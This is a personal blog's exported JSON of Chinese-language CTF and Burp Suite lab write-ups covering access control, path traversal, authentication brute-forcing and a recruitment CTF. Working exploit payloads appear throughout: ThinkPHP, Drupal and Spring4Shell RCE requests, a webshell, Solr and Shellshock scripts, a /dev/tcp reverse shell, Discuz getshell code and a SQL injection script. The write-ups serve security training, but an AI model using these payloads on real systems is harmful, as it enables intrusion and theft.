{"meta":{"title":"Narcherの小窝","subtitle":"","description":"","author":"Narcher Alter","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"","slug":"Burpsuite靶场--Access_control(后四道)","date":"2024-01-10T08:19:59.663Z","updated":"2024-01-10T08:19:29.452Z","comments":true,"path":"2024/01/10/Burpsuite靶场--Access_control(后四道)/","link":"","permalink":"http://example.com/2024/01/10/Burpsuite%E9%9D%B6%E5%9C%BA--Access_control(%E5%90%8E%E5%9B%9B%E9%81%93)/","excerpt":"Burpsuite靶场–Access_control(后四道)作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup","text":"Burpsuite靶场–Access_control(后四道)作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup URL-based access control can be circumvented此网站在&#x2F;admin处有一个未经身份验证的管理面板，但前端不可访问，后端支持X-Original-Url，因此我们可以点击admin后抓包，将GET访问的&#x2F;admin改成&#x2F;，添加X-Original-Url:/admin，发现成功。 再根据返回的前端提示修改为/admin/delete，并GET传参?usernmae&#x3D;carlos，即可成功。 Method-based access control can be circumvented登录administrator，进入Admin panel，选择carlos，点击Upgrade user，并抓包，send to Repeater。 再登录wiener，随便点击任意页面，抓包获取cookie。 将更改权限数据包中的cookie改成wiener的cookie。 请求方式改成POSTX，返回缺少参数，之后再更改请求方法为GET，修改username为wiener，发送（此时一定要处于wiener登录的状态），即可成功。 Multi-step process with no access control on one step登录administrator，进入Admin panel，选择carlos，点击Upgrade user，并抓包，send to Repeater。之后还有一个页面询问Are you sure？，点击yes，同时抓包发送到repeater。 之后登录wiener，随便抓一个包获取cookie，进入repeater，将两个包依次修改为wiener的cookie和姓名并发包，即可成功。 Referer-based access control登录administrator，进入Admin panel，选择carlos，点击Upgrade user，并抓包，send to Repeater。 之后登录wiener，随便抓一个包获取cookie，进入repeater，修改为wiener的cookie和姓名并发包，即可成功。 后两题考点： ​ （图源：http://t.csdnimg.cn/zrhTX，侵删）","categories":[],"tags":[]},{"title":"","slug":"Burpsuite靶场--Path_Traversal","date":"2024-01-10T04:04:03.310Z","updated":"2024-01-10T04:03:31.487Z","comments":true,"path":"2024/01/10/Burpsuite靶场--Path_Traversal/","link":"","permalink":"http://example.com/2024/01/10/Burpsuite%E9%9D%B6%E5%9C%BA--Path_Traversal/","excerpt":"Burpsuite靶场–Path_Traversal作者：Narcher 时间：2024&#x2F;1&#x2F;10 分类：writeup","text":"Burpsuite靶场–Path_Traversal作者：Narcher 时间：2024&#x2F;1&#x2F;10 分类：writeup File path traversal, simple case随便打开一个博客，抓包，将?filename&#x3D;后的数据改成../../../../../etc/passwd即可。 File path traversal, traversal sequences blocked with absolute path bypass在这道题目中，..被禁用。因此我们无法使用相对路径../解题，仅能使用绝对路径/解题。 （在Linux系统中，文件路径是非常重要的。&#x2F;etc&#x2F;passwd和etc&#x2F;passwd看起来很相似，但实际上它们指向的是完全不同的位置。 /etc/passwd：这是一个绝对路径，它从文件系统的根目录/开始，指向etc目录下的passwd文件。这个文件存储了系统中所有用户的基本信息。 etc/passwd：这是一个相对路径，它从当前工作目录开始，指向当前目录下的etc子目录中的passwd文件。如果当前工作目录下没有etc子目录或者etc子目录中没有passwd文件，那么这个路径就无法正确地找到文件。） 因此，将?filename&#x3D;后的数据改成/etc/passwd即可。 File path traversal, traversal sequences stripped non-recursively非递归地剥离遍历序列时，使用....//或....\\/将其恢复成正常遍历序列。 将?filename&#x3D;后的数据改成....//....//....//etc/passwd即可。 File path traversal, traversal sequences stripped with superfluous URL-decode根据题目描述，本题需要通过url编码来绕过过滤，因此对..&#x2F;进行两次url编码。 将?filename&#x3D;后的数据改成%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd即可。 File path traversal, validation of start of path本题的目录遍历必须以预期的基文件开头即/var/www/images/，因此将?filename&#x3D;后的数据改成/var/www/images/../../../../etc/passwd即可。 File path traversal, validation of file extension with null byte bypass本题的目录遍历对文件名后缀的验证，因此我们可以使用%00截断。 将?filename&#x3D;后的数据改成../../../../../etc/passwd%00.jpg即可。","categories":[],"tags":[]},{"title":"","slug":"Burpsuite靶场--Authentication","date":"2023-12-03T14:37:29.364Z","updated":"2023-12-03T14:36:46.424Z","comments":true,"path":"2023/12/03/Burpsuite靶场--Authentication/","link":"","permalink":"http://example.com/2023/12/03/Burpsuite%E9%9D%B6%E5%9C%BA--Authentication/","excerpt":"Burpsuite靶场–Authentication作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup","text":"Burpsuite靶场–Authentication作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup Broken brute-force protection, IP block打开靶场，进入login界面，随便输入账号密码然后burp抓包，之后发送到Intruder模块，模式选择Pitchfork。 由于每错次个就会封ip，所以我们需要在需要爆破的用户名和密码中交替插入正确的用户名和密码，并保证一一对应。 利用notepad++的替换功能，制作字典。 密码字典同理。 之后分别在payload1和payload2导入字典，设置线程数为1，即可开始爆破。 设置筛选carlos 找到长度异常的请求，使用其payload1和payload2登录成功 Username enumeration via account lock本题重复登录5次就会锁定账号，所以把所有账号进行5次枚举，使用Intruder中的Cluster bomb 发现异常数据，猜测auth为用户名，故爆破其密码（虽然有锁定，但我们可以观察报错信息），选用Sniper 发现123456789为密码时报错信息长度异常，使用auth:123456789登录，成功 2FA broken logic先登录wiener:peter，在burp的target-map下找到此网站的login2 尝试将verify修改为我们要攻击的账号，故退出登录，重新登录wiener:peter，只是这次拦截login2，先放过第一个包，再拦截第二个包和第三个包并修改verify为carlos，完成之后发现还要输入验证码，根据登录wiener:peter的经验可知验证码是4位纯数字组合，因此我们直接爆破即可 得验证码为1657，之后输入验证码同时拦截包，将verify改为carlos，即可成功 Brute-forcing a stay-logged-in cookie首先根据现有凭据登录，并勾选stay logged in 登录之后发现存在stay-logged-in base64解密得:wiener:51dc30ddc473d43a6011e9ebba6ca770 后面的部分用MD5解密得到peter 于是我们先退出登录，之后对stay-logged-in进行爆破 需要设置好payload的处理方式，先对密码进行MD5加密，之后添加前缀carlos:，最后进行baes64加密，之后开始爆破 根据长度排序 Y2FybG9zOjlkZjNiMDFjNjBkZjIwZDEzODQzODQxZmYwZDQ0ODJj base64解密：carlos:9df3b01c60df20d13843841ff0d4482c MD5解密：access 成功 Offline password cracking首先利用现有凭据wiener:peter登录，之后去首页随便找一篇博客评论 之后去access log里找到stay-logged-in：Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz base64解密：carlos:26323c16d5f4dabff3bb136f2460a943 MD5解密：onceuponatime 之后删除carlos的账户即可成功 Password reset poisoning via middleware首先，点击忘记密码，输入carlos的用户名，点击submit后用burp拦截，在header位置添加X-Forwarded-Host并指向自己的服务器 之后去服务器的日志中查看发现获取到了carlos的token：3ek1baacsobkwf15q6sqjetimcb6atm8 之后登录wiener的账号并去获取wiener的邮箱账号，并填写在忘记密码页面的信息栏中 前往邮箱获取到重置密码的url，将token改为carlos的token并访问 修改好密码后在点击提交时拦截，将token改为carlos的token并发送 之后用修改后的密码登录carlos即可成功 Password brute-force via password change首先登录wiener:peter，之后通过修改密码查看返回信息 当原密码正确，新密码不一致时，提示New passwords do not match 当原密码错误，新密码不一致时，提示Current password is incorrect 因此我们可以使用新密码不一致来爆破原密码 载入字典，并设置好匹配关键字 爆破成功 之后使用carlos:654321登录即可完成 Broken brute-force protection, multiple credentials per request登录拦截，发现以json格式发送登录凭据 故将字典修改格式 之后以[数据块]的格式发送密码即可成功 2FA bypass using a brute-force attack先利用carlos:montoya进入验证码界面，随便输入验证码测试，发现输入两次错误验证码后会自动终止会话，但是，该用户并未被锁定，意味着我可以无限制地尝试。 如果每次尝试2FA会不断变化，我们没有办法爆破，但如果2FA在使用之前都一直有效，那么我们便可对其进行暴力破解。 登录过程涉及多个需要按顺序执行的请求，因此，我们可以使用宏，并尝试将这些请求合并到一个宏中。 操作步骤如下： &lt;1&gt;登录carlos:montoya &lt;2&gt;随便输入一个验证码，点击提交，报错 &lt;3&gt;进入burp，Project options的sessions，在Macro中选择如下的三个包，并Test macro正常 &lt;4&gt;进入session handling rules，点击Add，在 Scope的URL Scope中, 选择选项 Include all URLs；在Details中点击Add选择Run a marco，并将&lt;3&gt;中的marco加进去 &lt;5&gt;将POST &#x2F;login2发送给Intruder，将字典设置为0000-9999，线程数设为1，爆破验证码即可 (爆破速度超级慢，不建议尝试，等之后有时间再做吧)","categories":[],"tags":[]},{"title":"","slug":"YulinSec-Recruit-2023-WP","date":"2023-10-31T01:54:13.746Z","updated":"2023-11-03T15:08:59.902Z","comments":true,"path":"2023/10/31/YulinSec-Recruit-2023-WP/","link":"","permalink":"http://example.com/2023/10/31/YulinSec-Recruit-2023-WP/","excerpt":"YulinSec Recruit 2023 WP作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup","text":"YulinSec Recruit 2023 WP作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup [Baby]†签到†密文： 密码本： 解码之后：，之后再将解码后的表按先一三后二四的顺序解读，即得明文：WELCOME TO THE CTF GAME！ 题目要求我们将Flag以YulinSec{}包裹，并在每个英文单词间加入单下划线，所有英文字母均为小写。 处理一下得：YulinSec{welcome_to_the_ctf_game!} [Mid-]马赛克星球这题我只做出了第一问，太菜了~~~呜呜~ 根据题目描述我们得知图片先会被马赛克覆盖，后被系统处理后丢尽回收站，因此我们需要按顺序进行。首先进行系统处理的恢复，具体这么做呢？先把图片下载下来康康。 我们得到这个： （什么鬼东西啊！！！） 既然是系统处理，嗯~ o(￣▽￣)o……，啥也想不起来，那我们就按老一套先一把梭试试，先放进binwalk里康康： 发现藏得有东西，我们分离一下： 得到加密马赛克的代码（个人猜测可能和第二问有关）。 这一步操作结束了，并没有得到对第一问有用的信息，我们再去试试下一步经典操作：改图片宽高。 直接上github上找个脚本，恢复一下图片的宽高： 由此我们得到了被打上马赛克的图片，并得到了Flag: [Easy]盒武器你是？我们下载第一张图片： 放到google识图上看看，一眼武汉理工大学南湖校区的图书馆，但MD5之后交Flag发现不对，经询问铃兰小姐得知要交图书馆的名字，于是改成YulinSec{md5(武汉理工大学南湖校区心至楼)}。 第二问很奇怪，一眼是武汉长江大桥，拍摄视角看起来像是在龟山公园附近，但我把附近的景点都梭哈了一遍也没成功…… 你的名字是？第二问通过问出题人，发现是我猪鼻了，其实还是让题目描述误导了，题目描述举出的例子是人民公园，让我误以为是找公园名字了…… 位置确实是龟山公园没错，但景点应该写龟山风景区，于是改成YulinSec{md5(湖北省武汉市汉阳区龟山北路5号龟山风景区)}。 我怎么想不起来了&gt;w&lt;第三问的话看出题人QQ空间锁定好时间区间爆破就好了(貌似有更好的办法，但我还没找到)。 【Baby】babyurl本题考查ssrf。 这道题本来我是通过绕过localhost做的，后来才知道那是非预期，于是我又重新做了一遍。 首先我们访问题目网页。如下： 查看一下源码： &lt;!-- if(isset($_GET[&#39;urls&#39;]))&#123; $urls = $_GET[&#39;urls&#39;]; $url_host = parse_url($urls,PHP_URL_HOST); curl_get($urls); &#125; --&gt; 点击here得：Please access through local host 既然如此，看了源码再加上题目描述，我们就明白了这是一道ssrf bypass题，因此我们根据源码顺序构造url，GET传参urls,根据要求在头部添加http://,直接传127.0.0.1会被过滤： 因此我们根据题目描述中的格式构造传参?urls=http://foo@127.0.0.1:80@google.com/flag.php，得到flag。 原理就是利用parse_url与curl_get对url解析的不同方式来绕过。 【Baby】babyphp本题考查php的弱比较与强碰撞的绕过。 首先，是对弱比较的绕过。让a!&#x3D;b，但sha1值要相等，我们利用数组绕过： 原理为sha1函数无法处理数组，如果传入的是数组，那么会返回NULL，使二者比较起来相等。 再做第二问的强碰撞。 由于是===，无法使用数组绕过，并且代码是执行我们输入的Yu，而不是直接输出Flag，我们可以使用fastcoll对一句话木马进行处理，使其eval执行我们的一句话木马，进而用蚁剑连接。工具的具体使用方法就请去百度学习吧，这里直接贴出payload:?Yu=%40eval%28%24_POST%5B%22cmd%22%5D%29%3B+%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%DAq%2B%97%8D%02%9B%5C%B5%86%B4%26%E9%DE%BC%CF%FF%FB%DF%F1%B9%BC4%89-%26%825u8%1D%F5J%F1%F9%C8%E0%E7%FF%E7%0F%0C%CC%11%A9%BB%D4%17%DE%85%B5j%F5%A9%26c%1Aa%89%0E%A3y%96E%A2%C1%F4%87f%9B%1E%F7%17%FA%86%E5%A1m%95%97k7%00%C9%26%7E%23%7E%84%B9%9FO_%11%AF%C1%98%CA%B0%2A%85%89%93%DE%ED%9D%EB%98C%EE%E0%02%1C%23V%DD%C2%15%D5%F1iI%D9%21%1E%8E%F8%05&amp;lin=%40eval%28%24_POST%5B%22cmd%22%5D%29%3B+%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%DAq%2B%97%8D%02%9B%5C%B5%86%B4%26%E9%DE%BC%CF%FF%FB%DFq%B9%BC4%89-%26%825u8%1D%F5J%F1%F9%C8%E0%E7%FF%E7%0F%0C%CC%11%A9%3B%D4%17%DE%85%B5j%F5%A9%26c%1Aa%89%8E%A3y%96E%A2%C1%F4%87f%9B%1E%F7%17%FA%86%E5%A1m%95%97k7%00I%26%7E%23%7E%84%B9%9FO_%11%AF%C1%98%CA%B0%2A%85%89%93%DE%ED%9D%EB%98Cn%E1%02%1C%23V%DD%C2%15%D5%F1iI%D9%A1%1E%8E%F8%05 先在网页中执行一下，然后直接用蚁剑。 根目录发现flag2：YulinSec&#123;2b5e2408ee27c31493b3b4728a1afb85&#125;。 【Baby】babyunserialize本题考查基本的php反序列化。 下面我们先构造第一问的payload: &lt;?php$auth = array( &quot;username&quot; =&gt; &quot;YulinSec&quot;, &quot;passwd&quot; =&gt; &quot;i_love_php_unserialize&quot;,);echo serialize($auth);?&gt; 输出：a:2:&#123;s:8:&quot;username&quot;;s:8:&quot;YulinSec&quot;;s:6:&quot;passwd&quot;;s:22:&quot;i_love_php_unserialize&quot;;&#125; 用Hackbar传参得flag1: 接着我们构造第二问的payload: 这里需要提到两个知识点：__construct()魔术方法与php中的引用赋值（具体请自行百度）。 我们将构造的$a的序列化中的空改为%00，payload为：?data=O:5:&quot;Yulin&quot;:4:&#123;s:12:&quot;%00Yulin%00user1&quot;;i:20421610;s:12:&quot;%00Yulin%00user2&quot;;R:2;s:8:&quot;%00*%00pass1&quot;;i:116759636;s:8:&quot;%00*%00pass2&quot;;R:3;&#125; 之后传入得flag2: [EASY]Script Kiddie这题看题目要求，就知道是要学会当脚本小子。因此我们直接去网上找相应的exp即可。 第一题： 有经验的话应该看一眼就知道这是典型的thinkphp的漏洞了，直接去网上搜，这里贴上我搜到的一篇博客：攻防世界 ThinkPHP V5（漏洞解析及利用）-CSDN博客 直接payload:?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag拿到flag。（注：cat /flag可换成其他命令进行执行） 第二题： 继续去搜drupal的相关漏洞，挨个对比，发现是CVE-2018-7600，直接利用现成的payload: POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: 121.5.35.176:30003Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://121.5.35.176:30003/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: JSESSIONID=F52208D5FDBBB4330779120E1AD41487Connection: closeContent-Type:application/x-www-form-urlencodedContent-Length: 110 form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=cat /flag 得到flag：YulinSec&#123;svt9di2rrew26kysr3b3oipkobq40sao&#125;。 第三题： 继续去网上搜spring相关的漏洞，挨个对比，发现是CVE-2022-22965。之后便是按部就班的来。 发送以下请求以更改 Apache Tomcat 中的日志记录配置并将日志写入 JSP 文件： GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1Host: 121.5.35.176:30004Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closesuffix: %&gt;//c1: Runtimec2: &lt;%DNT: 1Content-Length: 2 然后，访问刚才的 JSP webshell，并执行任意命令，得到flag： 【Mid】MidBypass这道题应该是想教一下蚁剑的基本用法。 首先根据hint中的后门提示，用蚁剑连接： 之后点击即送flag1:YulinSec&#123;1602bc263c2a236f7f4a38859abb8d02&#125; 第二问大概就是要学一下蚁剑的插件使用: 之后直接在根目录下找到flag2: 【Mid】苕皮本题我是通过非预期来做的，之后立马被修了，呜呜呜~~~ 之后也没时间做这个题了，大概把我非预期的思路讲一讲吧。 在我做非预期解的时候，没有对base的过滤，因此，在经过几下本地传参测试后发现，过滤器在读取$shaopi时会控制字符的数量，后来经查证，貌似必须输入3的倍数。于是我们可以利用base64编码后可以随便加减等号的特性进行绕过。payload为：?filter=convert.base64-decode|&amp;shaopi=PChzaGFvcGkpPg 【Baby】RseaE(季末大酬宾)第一次做内网题，瘫~~~ 首先给linux配置上ssh的socks5代理具体方法详见此博客http://t.csdnimg.cn/fYTE4，之后便可直接在虚拟机上进行操作，无需将文件传输到服务器上。 直接利用fscan扫描内网存活主机，得： CVE-2019-17558：先访问http://10.0.20.121/solr/Yulin/config,写份脚本修改params.resource.loader.enabled为true，至此一切准备就绪。脚本贴在下面： import requestsimport json url = &quot;http://10.0.20.121/solr/Yulin/config&quot;headers = &#123; &quot;Content-Type&quot;: &quot;application/json&quot;,&#125;data = &#123; &quot;update-queryresponsewriter&quot;: &#123; &quot;startup&quot;: &quot;lazy&quot;, &quot;name&quot;: &quot;velocity&quot;, &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;, &quot;template.base.dir&quot;: &quot;&quot;, &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;, &quot;params.resource.loader.enabled&quot;: &quot;true&quot; &#125;&#125; response = requests.post(url, headers=headers, data=json.dumps(data)) print(response.status_code)print(response.text) 之后便可进行rce命令执行。 命令执行的payload稍微改一下就能用了，至于脚本，写一个能发包的就行。如下： import requests url = &#39;http://10.0.20.121/solr/Yulin/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/flag%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&#39; response = requests.get(url) print(response.text) CVE-2014-6271：这个比较简单，一个脚本就出来了： import requestsimport json url = &quot;http://10.0.20.156/yulin.cgi&quot;headers = &#123; &quot;User-Agent&quot;: &quot;() &#123; :; &#125;; echo; /bin/cat /flag&quot;,&#125; response = requests.post(url, headers=headers) print(response.status_code)print(response.text) 原理大概是该Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以()&#123;开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。 CVE-2019-0230：这个就麻烦许多（主要是没回显，需要将webshell打到portmap的监听端口上，之后在转发端口查看），在这里就讲一下大体思路吧，就不一步步来了（太麻烦了），首先，先将portmap传到目标服务器，之后设置监听端口与转发端口：./portmap -m 2 -p1 7003 -h2 10.0.20.111 -p2 7004随后利用脚本将命令bash -i &gt;&amp; /dev/tcp/10.0.20.111/7003 0&gt;&amp;1执行以实现反弹shell的目的，之后在本地利用proxychains通过nc监听7004端口数据，发现shell成功反弹，执行cat /flag获取flag：YulinSec&#123;Wo0!_s2_059_1s_s0_Danger0uS&#125; CVE-2014-0160：这个就简单许多了，直接用msf框架里现成的攻击模块就行了。下面的操作便是根据博客https://blog.csdn.net/weixin_39190897/article/details/106879383中的步骤完成。 先执行msfconsole运行msf框架： 再使用search heartbleed查找攻击模块： 之后执行命令use auxiliary/scanner/ssl/openssl_heartbleed选择第一个攻击模块： 设置对应的主机、端口参数： 最后运行run命令，可以看见靶机的64KB信息： 信息中间藏着flag：YulinSec&#123;Wo0!_My_heArt_1s_B133dinG&#125; 【Mid】链式反应本题只做了第一问，还是太菜了，要多练…… 求你先注册吧TAT &amp; 致命后台：进去之后发现是个论坛： 先随便注册一个账号试试（注意：这时候先看看admin账号是否有人，发现已经存在，说明我们注册之后要拿到admin账号的密码）： 注册之后发现有个系统提醒，点进来是admin账号的密码，因此我们可以利用这个来登录admin账号管理后台。 登录之后要干什么呢？（你问我我也不知道，当然是google啦！！！） 搜索Discuz x3.4 getshell，找到了一篇写的特别好的博客：https://www.svenbeast.com/post/discuzx34-hou-tai-xiu-gai-uc_center-pei-zhi-getshell/ 之后便是进入右上角的管理中心—站长—UCenter设置。 1.进入后台站长-UCenter设置，修改UCenter通信密钥为123456并记录下来，填入code.php，修改UC_API&#x3D;http://recruit.xxf.world:12088/uc_server&#39;);eval($_POST[sven]);//，点击保存 2.用大佬的脚本生成code参数的值(注意：此时操作必须加速，如果当超时之后，传参会返回别的内容而不是1，此时code值需要重新生成)： &lt;?php //code.php源代码，可直接使用$uc_key=&quot;123456&quot;;//此处填写刚才UCenter设置的值$time = time() + 720000;$str = &quot;time=&quot;.$time.&quot;&amp;action=updateapps&quot;;$code = authcode($str,&quot;ENCODE&quot;,$uc_key);$code = str_replace(&#39;+&#39;,&#39;%2b&#39;,$code);$code = str_replace(&#39;/&#39;,&#39;%2f&#39;,$code);echo $code; function authcode($string, $operation = &#39;DECODE&#39;, $key = &#39;&#39;, $expiry = 0) &#123; $ckey_length = 4; $key = md5($key != &#39;&#39; ? $key : &#39;123456&#39;); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == &#39;DECODE&#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#39;&#39;; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == &#39;DECODE&#39; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#39;%010d&#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = &#39;&#39;; $box = range(0, 255); $rndkey = array(); for($i = 0; $i &lt;= 255; $i++) &#123; $rndkey[$i] = ord($cryptkey[$i % $key_length]); &#125; for($j = $i = 0; $i &lt; 256; $i++) &#123; $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; &#125; for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123; $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); &#125; if($operation == &#39;DECODE&#39;) &#123; if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123; return substr($result, 26); &#125; else &#123; return &#39;&#39;; &#125; &#125; else &#123; return $keyc.str_replace(&#39;=&#39;, &#39;&#39;, base64_encode($result)); &#125;&#125;?&gt; 3.带code参数GET发送请求(发送这个请求前后台功能都是不正常的，发送后后台恢复正常)： 请求包如下（注意，code需要替换成上边代码跑出来的值）： GET /api/uc.php?code=3261GqyMWCKWcBrmvnAR%2fMsytT4CniPufkSLlq8qgFENXGRbemdZM%2fO0tQ5UDOmm0gkfa3FziIaBUL6vu2s HTTP/1.1Host: recruit.xxf.world:12088Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ar;q=0.8Connection: closeContent-Length: 127 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;root&gt;&lt;item id=&quot;UC_API&quot;&gt;http://recruit.xxf.world:12088/uc_server&lt;/item&gt;&lt;/root&gt; 4.此时 http://recruit.xxf.world:12088/config/config_ucenter.php就是我们的shell地址，至此getshell结束 5.进入根目录即可查看flag: [BABY]Yulin大超市题目本身不难，但具体操作比较繁琐，本人并没有全部做完，在此仅提供部分问的具体思路。 先根据网上的教程，把vmdk装在vmware上，并启动。 古老内核：cat /etc/redhat-release 旧日石板：启动宝塔，进入宝塔页面后点击左侧数据库，查看密码即可 积尘网页：进入网页后查看左上角图片即可： 草灰蛇线：宝塔页面下载后直接输入命令sha256sum 文件名查看 链颜如玉：九尾狐？？？铃兰小姐！！！ 蠕形混沌：robots.txt了解一下 [Mid]Flag的秘密本题考查内存取证。 1.先查看系统信息： 2.列出所有进程./volatility -f Dump.raw --profile=Win2003SP1x86 pslist： 发现notepad与mspaint两个可疑进程。 3.查看敏感文件： 4.提取flag.txt，./volatility -f Dump.raw --profile=Win2003SP1x86 dumpfiles -Q 0x060f95d8 --dump-dir=.: 查看文件内容，发现只有一串数字：70691670853271109852681369060149805628073794361873811272895446916236918634537737802124349238876320719507791592011549293924620129044462418733627976091293608166259846132773460344531124208572819109443346803355186858756595020342162362128266333303983191990037268180788288653684131880322571968703181766706931560885205101352007538331846213613023266466639921413852926790888220321442027205178887750649656145860474727432919114738728373475836303102255486346191364877477938535572331216821254191679994156591750446573045994279439932542854983843840 猜测和题目描述中的数学公式有关，于是进行万能的google，发现这其实是tupper公式中的key。 5.画图(画图时千万别用github上的脚本，不然会和我一样变得不幸) 提供一个在线网站：https://tuppers-formula.ovh/ 翻转180°得flag前半部分：M2tH_1z_ 继续推测，notepad中有flag前半部分，那么mspaint中大概率有flag的后半部分。 6.提取mspaint进程./volatility -f Dump.raw --profile=Win2003SP1x86 memdump -p 2148 --dump-dir=./ ，再将dmp后缀改为data，之后用GIMP软件查看，不断改变位移、宽高，即可得真实图像。 180°翻转后再镜像翻转即为flag后半部分。 完整flag为：YulinSec&#123;M2tH_1z_s0_iNtlsTInG&#125; [MID-]ezjavaflag1首先我们先看访问一下题目网页，由此可知要读取根目录下的flag1和flag2： 下载题目附件，之后反编译看源码。 由此可知传参方式：当访问&#x2F;flag1&#x2F;*目录时，会转到&#x2F;tmp&#x2F;*，而tmp目录的上一层目录即为根目录。 于是我们便可读取flag1: [MID+]猫物语这道题属实是思路新奇，是我没见过的类型。 先看一下题目描述吧： 根据题目描述我们可以知道本题考查sql注入，且无法使用延时注入和布尔盲注，于是我们可以从“所有内容在原本的基础上都会被加上随机一小段长度的喵！”上下手，增加原本内容的长度，使得返回的“喵”数量超过一定程度，并借此判断是否注入成功。之后的思路就和盲注思路一样了。 脚本如下： import requestsimport time chars = range(48, 129, 1)flag = &#39;&#39;global length length = 50 close = &quot;?id=-1&quot;for i in range(1, length + 1): for char1 in chars: url = &quot;http://124.220.110.41:20001/&quot; payload = &quot; union select 1,2,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),%d,1))=%d,repeat(&#39;a&#39;,50),1)--+&quot; % ( i, char1) url = url + close + payload res = requests.get(url) print(url + &#39;\\n&#39;) if &quot;喵&quot; * 50 in res.text: flag = flag + chr(char1) print(&quot;flag: &quot; + flag) break print(&quot;flag: &quot; + flag)print(&#39;flag:&#39;, flag) payload请自行根据想要得到的内容进行更改。","categories":[],"tags":[]}],"categories":[],"tags":[]}